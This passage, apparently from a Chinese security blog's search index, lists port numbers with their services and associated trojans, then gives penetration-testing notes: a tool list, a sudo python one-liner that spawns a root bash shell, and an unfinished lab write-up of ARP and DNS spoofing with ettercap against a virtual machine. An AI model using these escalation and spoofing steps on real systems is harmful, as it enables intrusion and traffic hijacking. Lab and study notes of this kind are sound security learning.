服务器<br>185 端口：远程-KIS<br>186 端口：KIS 协议<br>187 端口：应用通信接口<br>189 端口：队列文件传输<br>190 端口：网关进入控制协议<br>191 端口：Prospero 目录服务<br>192 端口：OSU 网络监视系统<br>193 端口：Spider 远程控制协议<br>194 端口：多线交谈协议<br>197 端口：目录地址服务<br>198 端口：目录地址服务监视器</p><h3 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h3><p>200 端口：IBM 系统资源控制器<br>201 端口：AppleTalk(Mac 机所用的网络协议)路由保证<br>202 端口：AppleTalk(Mac 机所用的网络协议)Name Binding<br>203 端口：AppleTalk(Mac 机所用的网络协议)未用端口<br>204 端口：AppleTalk(Mac 机所用的网络协议)回显<br>205 端口：AppleTalk(Mac 机所用的网络协议)未用端口<br>206 端口：AppleTalk(Mac 机所用的网络协议)区信息<br>207 端口：AppleTalk(Mac 机所用的网络协议)未用端口<br>208 端口：AppleTalk(Mac 机所用的网络协议)未用端口<br>209 端口：快速邮件传输协议<br>210 端口：ANSI(美国国家标准协会)Z39.50<br>211 端口：Texas Instruments 914C&#x2F;G 终端<br>213 端口：IPX(以太网所用的协议)<br>218 端口：Netix 消息记录协议<br>219 端口：Unisys ARPs<br>220 端口：交互邮件访问协议 v3<br>223 端口：证书分发中心<br>224 端口：masq 拨号器<br>241 端口：预留端口 (224-241)<br>245 端口：链接<br>246 端口：显示系统协议<br>257 端口：安全电子交易系统<br>258 端口：Yak Winsock 个人聊天<br>259 端口：有效短程遥控<br>260 端口：开放端口<br>261 端口：IIOP 基于 TLS&#x2F;SSL 的命名服务<br>266 端口：SCSI(小型计算机系统接口)on ST<br>267 端口：Tobit David 服务层<br>268 端口：Tobit David 复制<br>281 端口：个人连结<br>282 端口：Cable 端口 A&#x2F;X<br>286 端口：FXP 通信</p><h3 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h3><p>308 端口：Novastor 备份<br>313 端口：Magenta 逻辑<br>318 端口：PKIX 时间标记<br>333 端口：Texar 安全端口<br>344 端口：Prospero 数据存取协议<br>345 端口：Perf 分析工作台<br>346 端口：Zebra 服务器<br>347 端口：Fatmen 服务器<br>348 端口：Cabletron 管理协议<br>358 端口：Shrink 可上网家电协议<br>359 端口：网络安全风险管理协议<br>362 端口：SRS 发送<br>363 端口：RSVP 隧道<br>372 端口：列表处理<br>373 端口：Legend 公司<br>374 端口：Legend 公司<br>376 端口：AmigaEnvoy 网络查询协议<br>377 端口：NEC 公司<br>378 端口：NEC 公司<br>379 端口：TIA&#x2F;EIA&#x2F;IS-99 调制解调器客户端<br>380 端口：TIA&#x2F;EIA&#x2F;IS-99 调制解调器服务器<br>381 端口：hp(惠普)性能数据收集器<br>382 端口：hp(惠普)性能数据控制节点<br>383 端口：hp(惠普)性能数据警报管理<br>384 端口：远程网络服务器系统<br>385 端口：IBM 应用程序<br>386 端口：ASA 信息路由器定义文件.<br>387 端口：Appletalk 更新路由.<br>389 端口：轻型目录访问协议<br>395 端口：网络监视控制协议<br>396 端口：Novell(美国 Novell 公司)Netware(Novell 公司出的网络操作系统)over IP</p><h3 id="第六部分"><a href="#第六部分" class="headerlink" title="第六部分"></a>第六部分</h3><p>400 端口：工作站解决方案<br>401 端口：持续电源<br>402 端口：Genie 协议<br>406 端口：交互式邮件支持协议<br>408 端口：Prospero 资源管理程序<br>409 端口：Prospero 资源节点管理.<br>410 端口：DEC(数据设备公司)远程调试协议<br>411 端口：远程 MT 协议<br>412 端口：陷阱协定端口<br>413 端口：存储管理服务协议<br>414 端口：信息查询<br>415 端口：B 网络<br>423 端口：IBM 操作计划和控制开端<br>424 端口：IBM 操作计划和控制追踪<br>425 端口：智能计算机辅助设计<br>427 端口：服务起位置<br>434 端口：移动 ip 代理<br>435 端口：移动 ip 管理<br>443 端口：基于 TLS&#x2F;SSL 的网页浏览端口，能提供加密和通过安全端口传输的另一种 HTTP<br>444 端口：简单网络内存分页协议<br>445 端口：Microsoft-DS，为共享开放，震荡波病毒利用，一般应关闭<br>446 端口：DDM-远程关系数据库访问<br>447 端口：DDM-分布式文件管理<br>448 端口：DDM-使用安全访问远程数据库<br>456 端口：木马 HACKERS PARADISE 开放此端口<br>458 端口：apple quick time 软件开放端口<br>459 端口：ampr-rcmd 命令<br>464 端口：k 密码服务<br>469 端口：广播控制协议<br>470 端口：scx-代理<br>472 端口：ljk-登陆<br>481 端口：Ph 服务<br>487 端口：简单异步文件传输<br>489 端口：nest-协议<br>491 端口：go-登陆<br>499 端口：ISO ILL 协议</p><h3 id="第七部分"><a href="#第七部分" class="headerlink" title="第七部分"></a>第七部分</h3><p>500 端口：Internet 密钥交换，Lsass 开放端口，不能关闭<br>509 端口：陷阱<br>510 端口：FirstClass 协议<br>512 端口：远程进程执行<br>513 端口：远程登陆<br>514 端口：cmd 命令<br>515 端口：spooler<br>516 端口：可视化数据<br>518 端口：交谈<br>519 端口：unix 时间<br>520 端口：扩展文件名称服务器<br>525 端口：时间服务<br>526 端口：新日期<br>529 端口：在线聊天系统服务<br>530 端口：远程过程调用<br>531 端口：聊天<br>532 端口：读新闻<br>533 端口：紧急广播端口<br>534 端口：MegaMedia 管理端<br>537 端口：网络流媒体协议<br>542 端口：商业<br>543 端口：Kerberos(软件)v4&#x2F;v5<br>544 端口：krcmd 命令<br>546 端口：DHCPv6 客户端<br>547 端口：DHCPv6 服务器<br>552 端口：设备共享<br>554 端口：Real Time Stream 控制协议<br>555 端口：木马 PhAse1.0、Stealth Spy、IniKiller 开放此端口<br>556 端口：远距离文件服务器<br>563 端口：基于 TLS&#x2F;SSL 的网络新闻传输协议<br>564 端口：plan 9 文件服务<br>565 端口：whoami 查询<br>566 端口：streettalk<br>567 端口：banyan-rpc(远程过程调用)<br>568 端口：DPA 成员资格<br>569 端口：MSN 成员资格<br>570 端口：demon(调试监督程序)<br>571 端口：udemon(调试监督程序)<br>572 端口：声纳<br>573 端口：banyan-贵宾<br>574 端口：FTP 软件代理系统<br>581 端口：Bundle Discovery 协议<br>582 端口：SCC 安全<br>583 端口：Philips 视频会议<br>584 端口：密钥服务器<br>585 端口：IMAP4+SSL (Use 993 instead)<br>586 端口：密码更改<br>587 端口：申请<br>589 端口：Eye 连结<br>595 端口：CAB 协议<br>597 端口：PTC 名称服务<br>598 端口：SCO 网络服务器管理 3<br>599 端口：Aeolon Core 协议</p><h3 id="第八部分"><a href="#第八部分" class="headerlink" title="第八部分"></a>第八部分</h3><p>600 端口：Sun IPC(进程间通讯)服务器<br>601 端口：可靠系统登陆服务<br>604 端口：通道<br>606 端口：Cray 统一资源管理<br>608 端口：发送人-传递&#x2F;提供 文件传输器<br>609 端口：npmp-陷阱<br>610 端口：npmp-本地<br>611 端口：npmp-gui( 图形用户界面)<br>612 端口：HMMP 指引<br>613 端口：HMMP 操作<br>614 端口：SSL(加密套接字协议层)shell(壳)<br>615 端口：Internet 配置管理<br>616 端口：SCO(Unix 系统)系统管理服务器<br>617 端口：SCO 桌面管理服务器<br>619 端口：Compaq(康柏公司)EVM<br>620 端口：SCO 服务器管理<br>623 端口：ASF 远程管理控制协议<br>624 端口：Crypto 管理<br>631 端口：IPP (Internet 打印协议)<br>633 端口：服务更新(Sterling 软件)<br>637 端口：局域网服务器<br>641 端口：repcmd 命令<br>647 端口：DHCP(动态主机配置协议)Failover<br>648 端口：注册登记协议(RRP)<br>649 端口：Cadview-3d 软件协议<br>666 端口：木马 Attack FTP、Satanz Backdoor 开放此端口<br>808 端口：ccproxy http&#x2F;gopher&#x2F;ftp (over http)协议</p><h3 id="第九部分"><a href="#第九部分" class="headerlink" title="第九部分"></a>第九部分</h3><p>1001 端口：木马 Silencer，WebEx 开放端口<br>1011 端口：木马 Doly 开放端口<br>1024 端口：动态端口的开始,木马 yai 开放端口<br>1025 端口：inetinfo.exe(互联网信息服务)木马 netspy 开放端口<br>1026 端口：inetinfo.exe(互联网信息服务)<br>1027 端口：应用层网关服务<br>1030 端口：应用层网关服务<br>1031 端口：BBN IAD<br>1033 端口：本地网络信息端口<br>1034 端口：同步通知<br>1036 端口：安全部分传输协议<br>1070 端口：木马 Psyber Stream，Streaming Audio 开放端口<br>1071 端口：网络服务开放端口<br>1074 端口：网络服务开放端口<br>1080 端口：Socks 这一协议以通道方式穿过防火墙，允许防火墙后面的人通过一个 IP 地址访问 INTERNET<br>1110 端口：卡巴斯基反病毒软件开放此端口<br>1125 端口：卡巴斯基反病毒软件开放此端口<br>1203 端口：许可证生效端口<br>1204 端口：登陆请求监听端口<br>1206 端口：Anthony 数据端口<br>1222 端口：SNI R&amp;D 网络端口<br>1233 端口：普遍的附录服务器端口<br>1234 端口：木马 SubSeven2.0、Ultors Trojan 开放此端口<br>1243 端口：木马 SubSeven1.0&#x2F;1.9 开放此端口<br>1245 端口：木马 Vodoo，GabanBus，NetBus，Vodoo 开放此端口<br>1273 端口：EMC-网关端口<br>1289 端口：JWalk 服务器端口<br>1290 端口：WinJa 服务器端口</p><h3 id="第十部分"><a href="#第十部分" class="headerlink" title="第十部分"></a>第十部分</h3><p>1333 端口：密码策略(网络服务)(svchost.exe)<br>1334 端口：网络服务(svchost.exe)<br>1335 端口：数字公正协议<br>1336 端口：即时聊天协议(svchost.exe)<br>1349 端口：注册网络协议端口<br>1350 端口：注册网络协议端口<br>1352 端口：tcp lotusnote lotus note<br>1371 端口：富士通配置协议端口<br>1372 端口：富士通配置协议端口<br>1374 端口：EPI 软件系统端口<br>1376 端口：IBM 个人-个人软件端口<br>1377 端口：Cichlid 许可证管理端口<br>1378 端口：Elan 许可证管理端口<br>1380 端口：Telesis 网络许可证管理端口<br>1381 端口：苹果网络许可证管理端口<br>1386 端口：CheckSum 许可证管理端口<br>1387 端口：系统开放端口(rundll32.exe)<br>1388 端口：数据库高速缓存端口<br>1389 端口：文档管理端口<br>1390 端口：存储控制器端口<br>1391 端口：存储器存取服务器端口<br>1392 端口：打印管理端口<br>1393 端口：网络登陆服务器端口<br>1394 端口：网络登陆客户端端口<br>1395 端口：PC 工作站管理软件端口<br>1396 端口：DVL 活跃邮件端口<br>1397 端口：音频活跃邮件端口<br>1398 端口：视频活跃邮件端口<br>1399 端口：Cadkey 许可证管理端口<br>1433 端口：Microsoft 的 SQL 服务开放端口<br>1434 端口：Microsoft 的 SQL 服务监视端口<br>1492 端口：木马 FTP99CMP 开放此端口<br>1509 端口：木马 Psyber Streaming Server 开放此端口<br>1512 端口：Microsoft Windows 网络名称服务<br>1524 端口：许多攻击脚本安装一个后门 SHELL 于这个端口<br>1600 端口：木马 Shivka-Burka 开放此端口<br>1645 端口：远程认证拨号用户服务<br>1701 端口：第 2 层隧道协议<br>1731 端口：NetMeeting 音频调用控制<br>1801 端口：Microsoft 消息队列服务器<br>1807 端口：木马 SpySender 开放此端口<br>1900 端口：可被利用 ddos 攻击，一般关闭<br>1912 端口：金山词霸开放此端口<br>1981 端口：木马 ShockRave 开放此端口<br>1999 端口：木马 BackDoor,yai 开放此端口</p><h3 id="第十一部分"><a href="#第十一部分" class="headerlink" title="第十一部分"></a>第十一部分</h3><p>2000 端口：木马 GirlFriend 1.3、Millenium 1.0 开放此端口<br>2001 端口：木马 Millenium 1.0、Trojan Cow,黑洞 2001 开放此端口<br>2003 端口：GNU 查询<br>2023 端口：木马 Pass Ripper 开放此端口<br>2049 端口：NFS 程序常运行于此端口<br>2115 端口：木马 Bugs 开放此端口<br>2140 端口：木马 Deep Throat 1.0&#x2F;3.0，The Invasor 开放此端口<br>2500 端口：应用固定端口会话复制的 RPC 客户<br>2504 端口：网络平衡负荷<br>2565 端口：木马 Striker 开放此端口<br>2583 端口：木马 Wincrash 2.0 开放此端口<br>2801 端口：木马 Phineas Phucker 开放此端口<br>2847 端口：诺顿反病毒服务开放此端口</p><h3 id="第十二部分"><a href="#第十二部分" class="headerlink" title="第十二部分"></a>第十二部分</h3><p>3024 端口：木马 WinCrash 开放此端口<br>3128 端口：squid http 代理服务器开放此端口<br>3129 端口：木马 Master Paradise 开放此端口<br>3150 端口：木马 The Invasor,deep throat 开放此端口<br>3210 端口：木马 SchoolBus 开放此端口<br>3306 端口：MySQL 开放此端口<br>3333 端口：木马 Prosiak 开放此端口<br>3389 端口：WINDOWS 2000 终端开放此端口<br>3456 端口：inetinfo.exe(互联网信息服务)开放端口，VAT 默认数据<br>3457 端口：VAT 默认控制<br>3527 端口：Microsoft 消息队列服务器<br>3700 端口：木马 Portal of Doom 开放此端口<br>3996 端口：木马 RemoteAnything 开放此端口</p><h3 id="第十三部分"><a href="#第十三部分" class="headerlink" title="第十三部分"></a>第十三部分</h3><p>4000 端口：腾讯 QQ 客户端开放此端口<br>4060 端口：木马 RemoteAnything 开放此端口<br>4092 端口：木马 WinCrash 开放此端口<br>4133 端口：NUTS Bootp 服务器<br>4134 端口：NIFTY-Serve HMI 协议<br>4141 端口：Workflow 服务器<br>4142 端口：文档服务器<br>4143 端口：文档复制<br>4145 端口：VVR 控制<br>4321 端口：远程 Who Is 查询<br>4333 端口：微型 sql 服务器<br>4349 端口：文件系统端口记录<br>4350 端口：网络设备<br>4351 端口：PLCY 网络服务<br>4453 端口：NSS 警报管理<br>4454 端口：NSS 代理管理<br>4455 端口：PR 聊天用户<br>4456 端口：PR 聊天服务器<br>4457 端口：PR 注册<br>4480 端口：Proxy+ HTTP 代理端口<br>4500 端口：Lsass 开放端口，不能关闭<br>4547 端口：Lanner 许可管理<br>4555 端口：RSIP 端口<br>4590 端口：木马 ICQTrojan 开放此端口<br>4672 端口：远程文件访问服务器<br>4752 端口：简单网络音频服务器<br>4800 端口：Icona 快速消息系统<br>4801 端口：Icona 网络聊天<br>4802 端口：Icona 许可系统服务器<br>4848 端口：App 服务器-Admin HTTP<br>4849 端口：App 服务器-Admin HTTPS<br>4950 端口：木马 IcqTrojan 开放 5000 端口<br>第十四部分<br>5000 端口：木马 blazer5，Sockets de Troie 开放 5000 端口，一般应关闭<br>5001 端口：木马 Sockets de Troie 开放 5001 端口<br>5006 端口：wsm 服务器<br>5007 端口：wsm 服务器 ssl<br>5022 端口：mice 服务器<br>5050 端口：多媒体会议控制协议<br>5051 端口：ITA 代理<br>5052 端口：ITA 管理<br>5137 端口：MyCTS 服务器端口<br>5150 端口：Ascend 通道管理协议<br>5154 端口：BZFlag 游戏服务器<br>5190 端口：America-Online(美国在线)<br>5191 端口：AmericaOnline1(美国在线)<br>5192 端口：AmericaOnline2(美国在线)<br>5193 端口：AmericaOnline3(美国在线)<br>5222 端口：Jabber 客户端连接<br>5225 端口：HP(惠普公司)服务器<br>5226 端口：HP(惠普公司)<br>5232 端口：SGI 绘图软件端口<br>5250 端口：i 网关<br>5264 端口：3Com 网络端口 1<br>5265 端口：3Com 网络端口 2<br>5269 端口：Jabber 服务器连接<br>5306 端口：Sun MC 组<br>5321 端口：木马 Sockets de Troie 开放 5321 端口<br>5400 端口：木马 Blade Runner 开放此端口<br>5401 端口：木马 Blade Runner 开放此端口<br>5402 端口：木马 Blade Runner 开放此端口<br>5405 端口：网络支持<br>5409 端口：Salient 数据服务器<br>5410 端口：Salient 用户管理<br>5415 端口：NS 服务器<br>5416 端口：SNS 网关<br>5417 端口：SNS 代理<br>5421 端口：网络支持 2<br>5423 端口：虚拟用户<br>5427 端口：SCO-PEER-TTA(Unix 系统)<br>5432 端口：PostgreSQL 数据库<br>5550 端口：木马 xtcp 开放此端口<br>5569 端口：木马 Robo-Hack 开放此端口<br>5599 端口：公司远程安全安装<br>5600 端口：公司安全管理<br>5601 端口：公司安全代理<br>5631 端口：pcANYWHERE(软件)数据<br>5632 端口：pcANYWHERE(软件)数据<br>5673 端口：JACL 消息服务器<br>5675 端口：V5UA 应用端口<br>5676 端口：RA 管理<br>5678 端口：远程复制代理连接<br>5679 端口：直接电缆连接<br>5720 端口：MS-执照<br>5729 端口：Openmail 用户代理层<br>5730 端口：Steltor’s 日历访问<br>5731 端口：netscape(网景)suiteware<br>5732 端口：netscape(网景)suiteware<br>5742 端口：木马 WinCrash1.03 开放此端口<br>5745 端口：fcopy-服务器<br>5746 端口：fcopys-服务器<br>5755 端口：OpenMail(邮件服务器)桌面网关服务器<br>5757 端口：OpenMail(邮件服务器)X.500 目录服务器<br>5766 端口：OpenMail (邮件服务器)NewMail 服务器<br>5767 端口：OpenMail (邮件服务器)请求代理曾(安全)<br>5768 端口：OpenMail(邮件服务器) CMTS 服务器<br>5777 端口：DALI 端口<br>5800 端口：虚拟网络计算<br>5801 端口：虚拟网络计算<br>5802 端口：虚拟网络计算 HTTP 访问, d<br>5803 端口：虚拟网络计算 HTTP 访问, d<br>5900 端口：虚拟网络计算机显示 0<br>5901 端口：虚拟网络计算机显示 1<br>5902 端口：虚拟网络计算机显示 2<br>5903 端口：虚拟网络计算机显示 3<br>第十五部分<br>6000 端口：X Window 系统<br>6001 端口：X Window 服务器<br>6002 端口：X Window 服务器<br>6003 端口：X Window 服务器<br>6004 端口：X Window 服务器<br>6005 端口：X Window 服务器<br>6006 端口：X Window 服务器<br>6007 端口：X Window 服务器<br>6008 端口：X Window 服务器<br>6009 端口：X Window 服务器<br>6456 端口：SKIP 证书发送<br>6471 端口：LVision 许可管理器<br>6505 端口：BoKS 管理私人端口<br>6506 端口：BoKS 管理公共端口<br>6507 端口：BoKS Dir 服务器,私人端口<br>6508 端口：BoKS Dir 服务器,公共端口<br>6509 端口：MGCS-MFP 端口<br>6510 端口：MCER 端口<br>6566 端口：SANE 控制端口<br>6580 端口：Parsec 主服务器<br>6581 端口：Parsec 对等网络<br>6582 端口：Parsec 游戏服务器<br>6588 端口：AnalogX HTTP 代理端口<br>6631 端口：Mitchell 电信主机<br>6667 端口：Internet 多线交谈<br>6668 端口：Internet 多线交谈<br>6670 端口：木马 Deep Throat 开放此端口<br>6671 端口：木马 Deep Throat 3.0 开放此端口<br>6699 端口：Napster 文件(MP3)共享服务<br>6701 端口：KTI&#x2F;ICAD 名称服务器<br>6788 端口：SMC 软件-HTTP<br>6789 端口：SMC 软件-HTTPS<br>6841 端口：Netmo 软件默认开放端口<br>6842 端口：Netmo HTTP 服务<br>6883 端口：木马 DeltaSource 开放此端口<br>6939 端口：木马 Indoctrination 开放此端口<br>6969 端口：木马 Gatecrasher、Priority 开放此端口<br>6970 端口：real 音频开放此端口<br>第十六部分<br>7000 端口：木马 Remote Grab 开放此端口<br>7002 端口：使用者&amp; 组 数据库<br>7003 端口：音量定位数据库<br>7004 端口：AFS&#x2F;Kerberos 认证服务<br>7005 端口：音量管理服务<br>7006 端口：错误解释服务<br>7007 端口：Basic 监督进程<br>7008 端口：服务器-服务器更新程序<br>7009 端口：远程缓存管理服务<br>7011 端口：Talon 软件发现端口<br>7012 端口：Talon 软件引擎<br>7013 端口：Microtalon 发现<br>7014 端口：Microtalon 通信<br>7015 端口：Talon 网络服务器<br>7020 端口：DP 服务<br>7021 端口：DP 服务管理<br>7100 端口：X 字型服务<br>7121 端口：虚拟原型许可证管理<br>7300 端口：木马 NetMonitor 开放此端口<br>7301 端口：木马 NetMonitor 开放此端口<br>7306 端口：木马 NetMonitor，NetSpy1.0 开放此端口<br>7307 端口：木马 NetMonitor 开放此端口<br>7308 端口：木马 NetMonitor 开放此端口<br>7323 端口：Sygate 服务器端<br>7511 端口：木马聪明基因开放此端口<br>7588 端口：Sun 许可证管理<br>7597 端口：木马 Quaz 开放此端口<br>7626 端口：木马冰河开放此端口<br>7633 端口：PMDF 管理<br>7674 端口：iMQ SSL 通道<br>7675 端口：iMQ 通道<br>7676 端口：木马 Giscier 开放此端口<br>7720 端口：Med 图象入口<br>7743 端口：Sakura 脚本传递协议<br>7789 端口：木马 ICKiller 开放此端口<br>7797 端口：Propel 连接器端口<br>7798 端口：Propel 编码器端口<br>第十七部分<br>8000 端口：腾讯 QQ 服务器端开放此端口<br>8001 端口：VCOM 通道<br>8007 端口：Apache(类似 iis)jServ 协议 1.x<br>8008 端口：HTTP Alternate<br>8009 端口：Apache(类似 iis)JServ 协议 1.3<br>8010 端口：Wingate 代理开放此端口<br>8011 端口：木马 way2.4 开放此端口<br>8022 端口：OA-系统<br>8080 端口：WWW 代理开放此端口<br>8081 端口：ICECap 控制台<br>8082 端口：BlackIce(防止黑客软件)警报发送到此端口<br>8118 端口：Privoxy HTTP 代理<br>8121 端口：Apollo 数据端口<br>8122 端口：Apollo 软件管理端口<br>8181 端口：Imail<br>8225 端口：木马灰鸽子开放此端口<br>8311 端口：木马初恋情人开放此端口<br>8351 端口：服务器寻找<br>8416 端口：eSpeech Session 协议<br>8417 端口：eSpeech RTP 协议<br>8473 端口：虚拟点对点<br>8668 端口：网络地址转换<br>8786 端口：Message 客户端<br>8787 端口：Message 服务器<br>8954 端口：Cumulus 管理端口<br>第十八部分<br>9000 端口：CS 监听<br>9001 端口：ETL 服务管理<br>9002 端口：动态 id 验证<br>9021 端口：Pangolin 验证<br>9022 端口：PrivateArk 远程代理<br>9023 端口：安全网络登陆-1<br>9024 端口：安全网络登陆-2<br>9025 端口：安全网络登陆-3<br>9026 端口：安全网络登陆-4<br>9101 端口：Bacula 控制器<br>9102 端口：Bacula 文件后台<br>9103 端口：Bacula 存储邮件后台<br>9111 端口：DragonIDS 控制台<br>9217 端口：FSC 通讯端口<br>9281 端口：软件传送端口 1<br>9282 端口：软件传送端口 2<br>9346 端口：C 技术监听<br>9400 端口：木马 Incommand 1.0 开放此端口<br>9401 端口：木马 Incommand 1.0 开放此端口<br>9402 端口：木马 Incommand 1.0 开放此端口<br>9594 端口：信息系统<br>9595 端口：Ping Discovery 服务<br>9800 端口：WebDav 源端口<br>9801 端口：Sakura 脚本转移协议-2<br>9802 端口：WebDAV Source TLS&#x2F;SSL<br>9872 端口：木马 Portal of Doom 开放此端口<br>9873 端口：木马 Portal of Doom 开放此端口<br>9874 端口：木马 Portal of Doom 开放此端口<br>9875 端口：木马 Portal of Doom 开放此端口<br>9899 端口：木马 InIkiller 开放此端口<br>9909 端口：域名时间<br>9911 端口：SYPECom 传送协议<br>9989 端口：木马 iNi-Killer 开放此端口<br>9990 端口：OSM Applet 程序服务器<br>9991 端口：OSM 事件服务器<br>第十九部分<br>10000 端口：网络数据管理协议<br>10001 端口：SCP 构造端口<br>10005 端口：安全远程登陆<br>10008 端口：Octopus 多路器<br>10067 端口：木马 iNi-Killer 开放此端口<br>10113 端口：NetIQ 端点<br>10115 端口：NetIQ 端点<br>10116 端口：NetIQVoIP 鉴定器<br>10167 端口：木马 iNi-Killer 开放此端口<br>11000 端口：木马 SennaSpy 开放此端口<br>11113 端口：金山词霸开放此端口<br>11233 端口：木马 Progenic trojan 开放此端口<br>12076 端口：木马 Telecommando 开放此端口<br>12223 端口：木马 Hack’99 KeyLogger 开放此端口<br>12345 端口：木马 NetBus1.60&#x2F;1.70、GabanBus 开放此端口<br>12346 端口：木马 NetBus1.60&#x2F;1.70、GabanBus 开放此端口<br>12361 端口：木马 Whack-a-mole 开放此端口<br>13223 端口：PowWow 客户端，是 Tribal Voice 的聊天程序<br>13224 端口：PowWow 服务器，是 Tribal Voice 的聊天程序<br>16959 端口：木马 Subseven 开放此端口<br>16969 端口：木马 Priority 开放此端口<br>17027 端口：外向连接<br>19191 端口：木马蓝色火焰开放此端口<br>第二十部分<br>20000 端口：木马 Millennium 开放此端口<br>20001 端口：木马 Millennium 开放此端口<br>20034 端口：木马 NetBus Pro 开放此端口<br>21554 端口：木马 GirlFriend 开放此端口<br>22222 端口：木马 Prosiak 开放此端口<br>23444 端口：木马网络公牛开放此端口<br>23456 端口：木马 Evil FTP、Ugly FTP 开放此端口<br>25793 端口：Vocaltec 地址服务器<br>26262 端口：K3 软件-服务器<br>26263 端口：K3 软件客户端<br>26274 端口：木马 Delta 开放此端口<br>27374 端口：木马 Subseven 2.1 开放此端口<br>第二十一部分<br>30100 端口：木马 NetSphere 开放此端口<br>30129 端口：木马 Masters Paradise 开放此端口<br>30303 端口：木马 Socket23 开放此端口<br>30999 端口：木马 Kuang 开放此端口<br>31337 端口：木马 BO(Back Orifice)开放此端口<br>31338 端口：木马 BO(Back Orifice)，DeepBO 开放此端口<br>31339 端口：木马 NetSpy DK 开放此端口<br>31666 端口：木马 BOWhack 开放此端口<br>31789 端口：Hack-a-tack<br>32770 端口：sun solaris RPC 服务开放此端口<br>33333 端口：木马 Prosiak 开放此端口<br>33434 端口：路由跟踪<br>34324 端口：木马 Tiny Telnet Server、BigGluck、TN 开放此端口<br>36865 端口：KastenX 软件端口<br>38201 端口：Galaxy7 软件数据通道<br>39681 端口：TurboNote 默认端口<br>第二十二部分<br>40412 端口：木马 The Spy 开放此端口<br>40421 端口：木马 Masters Paradise 开放此端口<br>40422 端口：木马 Masters Paradise 开放此端口<br>40423 端口：木马 Masters Paradise 开放此端口<br>40426 端口：木马 Masters Paradise 开放此端口<br>40843 端口：CSCC 防火墙<br>43210 端口：木马 SchoolBus 1.0&#x2F;2.0 开放此端口<br>43190 端口：IP-PROVISION<br>44321 端口：PCP 服务器(pmcd)<br>44322 端口：PCP 服务器(pmcd)代理<br>44334 端口：微型个人防火墙端口<br>44442 端口：ColdFusion 软件端口<br>44443 端口：ColdFusion 软件端口<br>44445 端口：木马 Happypig 开放此端口<br>45576 端口：E 代时光专业代理开放此端口<br>47262 端口：木马 Delta 开放此端口<br>47624 端口：Direct Play 服务器<br>47806 端口：ALC 协议<br>48003 端口：Nimbus 网关<br>第二十三部分<br>50505 端口：木马 Sockets de Troie 开放此端口<br>50766 端口：木马 Fore 开放此端口<br>53001 端口：木马 Remote Windows Shutdown 开放此端口<br>54320 端口：木马 bo2000 开放此端口<br>54321 端口：木马 SchoolBus 1.0&#x2F;2.0 开放此端口<br>61466 端口：木马 Telecommando 开放此端口<br>65000 端口：木马 Devil 1.03 开放此端口<br>65301 端口：PC Anywhere 软件开放端口</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 计算机 </category>
+          
+          <category> 硬件 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 端口 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Web渗透流程</title>
+      <link href="/2024/12/11/webst/"/>
+      <url>/2024/12/11/webst/</url>
+      
+        <content type="html"><![CDATA[<p>在这里整理一下Web渗透流程中工具利用</p><h2 id="1-收集信息"><a href="#1-收集信息" class="headerlink" title="1 收集信息"></a>1 收集信息</h2><p>maltego   </p><h2 id="2-查询ip信息"><a href="#2-查询ip信息" class="headerlink" title="2 查询ip信息"></a>2 查询ip信息</h2><p>nmap ettercap fping  netdiscover</p><h2 id="3-查询Web信息"><a href="#3-查询Web信息" class="headerlink" title="3 查询Web信息"></a>3 查询Web信息</h2><pre><code>网站注册信息网页架构 WhatRuns whatweb目录爆破  dirb  dirsearch  gobuster  #通常看一眼robots.txt 漏洞查找 nikto skipfish git修复 githack 注入 sqlmap #查找cookie 密码爆破 Hydra John</code></pre><h2 id="4-远程登录"><a href="#4-远程登录" class="headerlink" title="4 远程登录"></a>4 远程登录</h2><pre><code>FinalShell   ssh(kali)</code></pre><h2 id="5-提权"><a href="#5-提权" class="headerlink" title="5 提权"></a>5 提权</h2><p>sodu -l 查看权限</p><p>提权方式很多 主机上可以通过命令提权 爆破拥有更高权限的用户密码等</p><p>除了主机上的操作 还有通过植入木马等方式获得反弹shell</p><p>su提权 <code>sucrack</code></p><p>ssh提权<code>hydra</code></p><p>php提权<a href="https://blog.csdn.net/qq_45924653/article/details/108466845">https://blog.csdn.net/qq_45924653/article/details/108466845</a></p><p>python提权 </p><pre><code class="python">sudo python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)</code></pre><p><a href="https://blog.csdn.net/jayjaydream/article/details/89363052?ops_request_misc=&request_id=&biz_id=102&utm_term=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E9%9B%86&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-89363052.142%5Ev100%5Epc_search_result_base6&spm=1018.2226.3001.4187">扩展工具</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 计算机 </category>
+          
+          <category> 渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>通过内网dns欺骗进行流量劫持</title>
+      <link href="/2024/12/11/%E9%80%9A%E8%BF%87%E5%86%85%E7%BD%91dns%E6%AC%BA%E9%AA%97%E8%BF%9B%E8%A1%8C%E6%B5%81%E9%87%8F%E5%8A%AB%E6%8C%81/"/>
+      <url>/2024/12/11/%E9%80%9A%E8%BF%87%E5%86%85%E7%BD%91dns%E6%AC%BA%E9%AA%97%E8%BF%9B%E8%A1%8C%E6%B5%81%E9%87%8F%E5%8A%AB%E6%8C%81/</url>
+      
+        <content type="html"><![CDATA[<h2 id="内网虚拟机windowsXp系统渗透尝试"><a href="#内网虚拟机windowsXp系统渗透尝试" class="headerlink" title="内网虚拟机windowsXp系统渗透尝试:"></a>内网虚拟机windowsXp系统渗透尝试:</h2><p>   使用Nessus查询发现存在 <code>IP Forwarding Enabled </code>漏洞</p><p>   使用ettercap  添加网关和ip为<code>target1</code> 和<code>target2</code> 执行ARP欺骗(虚拟机必须和网关在同一网段下) </p><p>   WireShark筛选条件选arp可以看到握手后攻击者主机mac地址成功成为中间人</p><h3 id="现在尝试DNS欺骗"><a href="#现在尝试DNS欺骗" class="headerlink" title="现在尝试DNS欺骗"></a>现在尝试DNS欺骗</h3><pre><code>vim /etc/ettercap/etter.dns  #添加*A &lt;攻击者主机ip&gt;</code></pre><p>打开apache服务 将电脑转为服务器</p><pre><code>/etc/init.d/apache2 